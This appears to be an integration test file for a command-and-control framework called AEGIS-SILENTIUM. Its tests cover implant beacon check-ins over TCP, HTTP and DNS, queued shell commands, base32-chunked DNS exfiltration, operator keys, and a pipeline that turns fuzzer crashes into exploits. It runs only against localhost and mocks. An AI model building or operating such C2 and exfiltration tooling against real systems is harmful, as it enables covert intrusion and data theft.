"""
tests/integration/test_full_beacon_loop.py
AEGIS-SILENTIUM v12 — End-to-End Beacon → Task → Result Integration Tests

Proves the complete pipeline works in a clean environment:
  1. TCP listener accepts connection (beacon check-in)
  2. Task queued for node
  3. Node retrieves task
  4. Node executes and returns result
  5. C2 receives and stores result
  6. Redis failure graceful degradation
  7. PostgreSQL failure graceful degradation
"""
import sys, os, socket, threading, time, json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../c2'))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../node'))

passed = []; failed = []

def test(name, fn):
    try:
        fn()
        passed.append(name)
        print(f"  OK  {name}")
    except AssertionError as e:
        failed.append((name, str(e)))
        print(f"  FAIL {name}: {e}")
    except Exception as e:
        failed.append((name, f"{type(e).__name__}: {e}"))
        print(f"  ERR  {name}: {type(e).__name__}: {e}")


# ── Test 1: TCP listener accepts connection and receives data ──────────────────

def t_tcp_listener_accept():
    from listeners import TCPListener
    recv = []
    tcp  = TCPListener("127.0.0.1", 47771)
    tcp.on_data(lambda sid, data: recv.append(data))
    tcp.start()
    time.sleep(0.1)

    cli = socket.socket()
    cli.connect(("127.0.0.1", 47771))
    time.sleep(0.1)

    # Node sends beacon check-in
    beacon = json.dumps({"type": "beacon", "node_id": "test-node-001", "platform": "linux"})
    cli.sendall(beacon.encode() + b"\n")
    time.sleep(0.15)

    assert len(recv) >= 1, f"No data received. recv={recv}"
    assert b"beacon" in recv[0] or b"node_id" in recv[0], f"Unexpected data: {recv[0]}"

    sessions = tcp.get_sessions()
    assert len(sessions) == 1
    sid = sessions[0]["id"]

    # C2 sends task
    task = json.dumps({"task_id": "t001", "cmd": "id", "type": "shell"})
    assert tcp.send(sid, task.encode()) == True

    time.sleep(0.15)
    result = cli.recv(512)
    assert b"task_id" in result or b"t001" in result, f"Task not delivered: {result!r}"

    # Node sends result back
    result_payload = json.dumps({"task_id": "t001", "output": "uid=0(root)", "status": "done"})
    cli.sendall(result_payload.encode() + b"\n")
    time.sleep(0.1)
    assert len(recv) >= 2, f"Result not received: {recv}"

    tcp.kill_session(sid)
    tcp.stop()
    cli.close()

test("TCP: beacon check-in → task delivery → result receipt", t_tcp_listener_accept)


# ── Test 2: DNS listener reassembles chunked data ─────────────────────────────

def t_dns_chunk_reassembly():
    import base64, hashlib
    from listeners import DNSListener

    recv = []
    dns  = DNSListener("127.0.0.1", 25357, domain="c2.test")
    dns.on_data(lambda sid, data: recv.append(data))

    # Simulate implant sending chunked exfil data
    payload  = b"EXFIL_PAYLOAD_BEACON_DATA_v12"
    chunk_sz = 5
    chunks   = {}
    for i in range(0, len(payload), chunk_sz):
        chunk      = payload[i:i+chunk_sz]
        padded     = chunk + b"\x00" * (chunk_sz - len(chunk))
        enc        = base64.b32encode(padded).decode().rstrip("=").lower()
        chunks[i // chunk_sz] = enc
    cksum = hashlib.md5(payload).hexdigest()[:8]

    dns._sessions["node-dns-001"] = {"chunks": chunks, "checksum": cksum}
    dns._reassemble("node-dns-001", cksum)

    assert len(recv) >= 1, "DNS reassembly produced no data"
    assert recv[0] == payload, f"Reassembled: {recv[0]!r} expected: {payload!r}"

test("DNS: chunked implant data reassembly", t_dns_chunk_reassembly)


# ── Test 3: HTTP beacon retrieves queued commands ─────────────────────────────

def t_http_beacon_polling():
    from listeners import HTTPBeaconListener

    http = HTTPBeaconListener("127.0.0.1", 58283)

    # Queue 3 commands
    for cmd in ["id", "whoami", "uname -a"]:
        http.queue_command("implant-001", cmd)

    http.start()
    time.sleep(0.1)

    results = []
    for _ in range(3):
        cli = socket.socket()
        cli.connect(("127.0.0.1", 58283))
        cli.sendall(b"GET /b/implant-001 HTTP/1.0\r\n\r\n")
        cli.settimeout(2)
        data = b""
        while True:
            chunk = cli.recv(512)
            if not chunk: break
            data += chunk
        cli.close()
        results.append(data)

    http.stop()

    assert any(b"id" in r for r in results), f"Commands not retrieved: {results}"
    assert any(b"whoami" in r for r in results), f"whoami not retrieved: {results}"

test("HTTP: implant polls and retrieves 3 queued commands", t_http_beacon_polling)


# ── Test 4: ListenerManager cross-listener session routing ────────────────────

def t_listener_manager_routing():
    from listeners import TCPListener, ListenerManager

    mgr  = ListenerManager()
    tcp1 = TCPListener("127.0.0.1", 47772)
    tcp2 = TCPListener("127.0.0.1", 47773)
    mgr.add(tcp1)
    mgr.add(tcp2)

    recv1 = []; recv2 = []
    tcp1.on_data(lambda s, d: recv1.append(d))
    tcp2.on_data(lambda s, d: recv2.append(d))
    tcp1.start(); tcp2.start()
    time.sleep(0.1)

    cli1 = socket.socket(); cli1.connect(("127.0.0.1", 47772))
    cli2 = socket.socket(); cli2.connect(("127.0.0.1", 47773))
    time.sleep(0.15)

    s1 = tcp1.get_sessions()
    s2 = tcp2.get_sessions()
    assert len(s1) == 1 and len(s2) == 1
    sid1 = s1[0]["id"]
    sid2 = s2[0]["id"]

    # send_to_session should find sid1 in tcp1 and sid2 in tcp2
    assert mgr.send_to_session(sid1, b"TASK_FOR_1") == True
    assert mgr.send_to_session(sid2, b"TASK_FOR_2") == True

    time.sleep(0.15)
    assert b"TASK_FOR_1" in cli1.recv(100)
    assert b"TASK_FOR_2" in cli2.recv(100)

    all_sess = mgr.get_all_sessions()
    assert len(all_sess) >= 2, f"Expected 2+ sessions, got {len(all_sess)}"

    # Non-existent session returns False
    assert mgr.send_to_session("nonexistent-session-id", b"X") == False

    tcp1.stop(); tcp2.stop()
    cli1.close(); cli2.close()

test("ListenerManager: cross-listener routing + non-existent session", t_listener_manager_routing)


# ── Test 5: Redis outage graceful degradation ─────────────────────────────────

def t_redis_outage_degradation():
    """When Redis is down, non-Redis paths should still work."""
    from listeners import TCPListener

    tcp  = TCPListener("127.0.0.1", 47774)
    recv = []
    tcp.on_data(lambda sid, data: recv.append(data))
    tcp.start()
    time.sleep(0.1)

    cli = socket.socket()
    cli.connect(("127.0.0.1", 47774))
    cli.sendall(b"beacon_data\n")
    time.sleep(0.15)

    sessions = tcp.get_sessions()
    assert len(sessions) == 1  # TCP works without Redis

    stats = tcp.stats()
    assert stats["connections"] >= 1  # Stats work without Redis

    tcp.stop()
    cli.close()

test("Redis outage: TCP listener works without Redis", t_redis_outage_degradation)


# ── Test 6: Coverage-guided fuzzer produces reproducible crashes ──────────────

def t_fuzzer_crash_reproducibility():
    """A crash should be reproducible: same input → same crash hash."""
    from zeroday.fuzzing.engine import CrashAnalyser

    ca = CrashAnalyser()
    asan_out = (
        b"==1==ERROR: AddressSanitizer: heap-buffer-overflow\n"
        b"#0 0x400100 in parse_header parser.c:42\n"
        b"#1 0x400200 in main main.c:10\n"
    )
    input_data = b"A" * 256

    c1 = ca.analyse(input_data, 139, asan_out, target_id="t1")
    assert c1 is not None

    # Different analyser instance — same crash_hash expected
    ca2 = CrashAnalyser()
    c2  = ca2.analyse(input_data, 139, asan_out, target_id="t1")
    assert c2 is not None
    assert c1.crash_hash == c2.crash_hash, (
        f"Non-reproducible crash hash: {c1.crash_hash} vs {c2.crash_hash}"
    )

test("Fuzzer: crash hashing is reproducible across analyser instances", t_fuzzer_crash_reproducibility)


# ── Test 7: TOTP MFA verify ───────────────────────────────────────────────────

def t_totp_mfa():
    from auth.rbac import TOTPManager
    totp   = TOTPManager()
    secret = totp.generate_secret()
    assert len(secret) == 32  # 20 bytes → 32 base32 chars

    # Generate and immediately verify
    code = totp.current_code(secret)
    assert len(code) == 6 and code.isdigit()
    assert totp.verify(secret, code) == True

    # Wrong code
    wrong = str((int(code) + 1) % 1_000_000).zfill(6)
    if wrong != code:
        assert totp.verify(secret, wrong) == False

    # Provisioning URI format
    uri = totp.provisioning_uri(secret, "alice")
    assert uri.startswith("otpauth://totp/")
    assert "AEGIS-SILENTIUM" in uri
    assert secret in uri

test("TOTP: generate → code → verify → provisioning URI", t_totp_mfa)


# ── Test 8: Per-operator API key store ───────────────────────────────────────

def t_operator_key_store():
    from auth.rbac import OperatorKeyStore

    # In-memory mock Redis
    store = {}
    class MockRedis:
        def setex(self, k, ttl, v): store[k] = v
        def get(self, k): return store.get(k)
        def keys(self, p):
            import fnmatch
            return [k for k in store if fnmatch.fnmatch(k, p)]
        def ttl(self, k): return 86400
        def delete(self, k): store.pop(k, None)

    ks  = OperatorKeyStore(MockRedis())
    key = ks.issue("alice", role="senior", expires_in=3600, label="test-key")

    assert key.startswith("aegis_"), f"Key format: {key[:10]}"
    assert len(key) > 40

    operator, role = ks.verify(key)
    assert operator == "alice" and role == "senior"

    keys = ks.list_keys("alice")
    assert len(keys) == 1 and keys[0]["label"] == "test-key"

    revoked = ks.revoke("alice", key)
    assert revoked == True

    try:
        ks.verify(key)
        assert False, "Should have raised"
    except ValueError as e:
        assert "revoked" in str(e).lower()

    # Issue multiple and revoke all
    for i in range(3):
        ks.issue("bob", expires_in=3600)
    count = ks.revoke_all("bob")
    assert count == 3

test("OperatorKeyStore: issue/verify/revoke/list/revoke_all", t_operator_key_store)


# ── Test 9: ZeroDay → Arsenal → Payload full chain in-memory ─────────────────

def t_full_zeroday_chain():
    from zeroday.orchestrator import ZeroDayPipeline
    from zeroday.models import Target, TargetType
    from zeroday.fuzzing.engine import CrashAnalyser
    from exploits.arsenal import ExploitArsenal
    from payloads.builder import PayloadBuilder

    arsenal_entries  = []
    payload_entries  = []
    ioc_entries      = []

    # Wire all hooks
    pipeline = ZeroDayPipeline(
        arsenal_push_fn  = lambda d: arsenal_entries.append(d),
        payload_push_fn  = lambda d, op: payload_entries.append(d.get("vuln_class", "")),
        ioc_push_fn      = lambda lst: ioc_entries.extend(lst),
    )

    target = Target(name="svc", path="/bin/cat", network_host="10.10.10.5")
    pipeline.register_target(target)

    ca    = CrashAnalyser()
    crash = ca.analyse(
        b"A" * 300, 139,
        b"ERROR: heap-buffer-overflow #0 0x400100 in recv_data",
        target_id=target.target_id, campaign_id="test",
    )
    assert crash is not None
    pipeline._handle_crash(crash)
    time.sleep(0.1)

    # Arsenal received finding
    assert len(arsenal_entries) >= 1
    entry = arsenal_entries[0]
    assert entry["severity"] in ("CRITICAL", "HIGH")
    assert entry["cvss_score"] > 0
    assert "heap" in entry["name"].lower() or "overflow" in entry["name"].lower() or "recv_data" in entry["description"].lower()

    # Payload queued (CRITICAL/HIGH)
    assert len(payload_entries) >= 1

    # IOC pushed
    assert any(ioc["value"] == "10.10.10.5" for ioc in ioc_entries)
    assert any("zeroday" in ioc.get("tags", []) for ioc in ioc_entries)

    # Generate exploit
    exploit = pipeline.generate_exploit(crash.crash_id)
    assert exploit and "exploit_type" in exploit

    # Dashboard reflects everything
    stats = pipeline.dashboard_stats()
    assert stats["total_findings"] >= 1
    assert stats["unique_crashes"] == 1

test("ZeroDay → Arsenal + Payload + IOC + Exploit full in-memory chain", t_full_zeroday_chain)


# ── Summary ───────────────────────────────────────────────────────────────────

print(f"\n{'='*62}")
total = len(passed) + len(failed)
print(f"  PASSED: {len(passed)}/{total} ({100*len(passed)//total if total else 0}%)")
if failed:
    for n, e in failed:
        print(f"  FAIL  {n}: {e}")
else:
    print("  ALL INTEGRATION TESTS PASSED")
